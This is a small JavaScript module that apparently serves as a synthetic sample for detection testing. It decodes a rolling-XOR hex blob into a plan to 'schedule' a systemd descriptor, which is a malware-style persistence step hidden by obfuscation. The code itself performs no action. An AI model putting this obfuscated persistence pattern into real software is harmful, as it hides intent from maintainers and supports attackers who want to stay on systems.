const moduleShape = Object.freeze({ format: "commonjs" });
const Material_f986a053 = "[\"4e\",\"73\",\"42\",\"3e\",\"4d\",\"39\",\"5c\",\"2c\",\"5f\",\"62\",\"00\",\"75\",\"1c\",\"70\",\"14\",\"4b\",\"38\",\"5b\",\"33\",\"56\",\"32\",\"47\",\"2b\",\"4e\",\"62\",\"10\",\"75\",\"12\",\"7b\",\"08\",\"7c\",\"19\",\"6b\",\"34\",\"50\",\"35\",\"46\",\"25\",\"57\",\"3e\",\"4e\",\"3a\",\"55\",\"27\",\"5b\",\"3a\",\"5e\",\"3f\",\"4f\",\"3b\",\"5e\",\"2c\",\"11\",\"62\",\"1b\",\"68\",\"1c\",\"79\",\"14\",\"70\",\"2f\",\"4b\",\"2e\",\"5d\",\"3e\",\"4c\",\"25\",\"55\",\"21\",\"4e\",\"3c\",\"40\",\"33\",\"47\",\"26\",\"41\",\"24\",\"7b\",\"18\",\"77\",\"02\",\"6c\",\"18\",\"25\",\"14\",\"68\",\"0b\",\"6a\",\"07\",\"77\",\"16\",\"7f\",\"18\",\"76\",\"29\",\"40\",\"24\",\"19\",\"57\",\"18\",\"5c\",\"19\",\"34\",\"06\",\"42\",\"7b\",\"43\",\"05\",\"46\",\"04\",\"46\",\"3a\",\"49\",\"2a\",\"42\",\"27\",\"43\",\"36\",\"5a\",\"3f\",\"60\",\"10\",\"71\",\"05\",\"6d\",\"50\",\"7f\",\"1a\",\"6e\",\"0d\",\"22\",\"41\",\"33\",\"5c\",\"32\",\"1c\",\"78\",\"57\",\"39\",\"56\",\"32\",\"57\",\"7a\",\"48\",\"2c\",\"15\",\"2d\",\"4b\",\"28\"]";
const Codec_f986a053 = "hex_array|rolling_xor|38";

function load_f986a053() { return JSON.parse(Material_f986a053).map((value) => Number.parseInt(value, 16)); }
function decode_f986a053(item1) { let item5 = 56; return item1.map((value) => { const decoded = value ^ item5; item5 = value; return decoded; }); }
async function recover_f986a053() {
  const item3 = [3, 5, 8, 13].slice(1, 3);
  const item1 = load_f986a053(); let item2 = [];
  let item4 = 0; while (item4++ < 1) item2 = decode_f986a053(item1);
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_f986a053() { return JSON.parse(JSON.stringify({ value: await recover_f986a053() })).value; }
async function plan_f986a053() { const inspect = inspect_f986a053; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }
void moduleShape; void plan_f986a053;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f986a053());
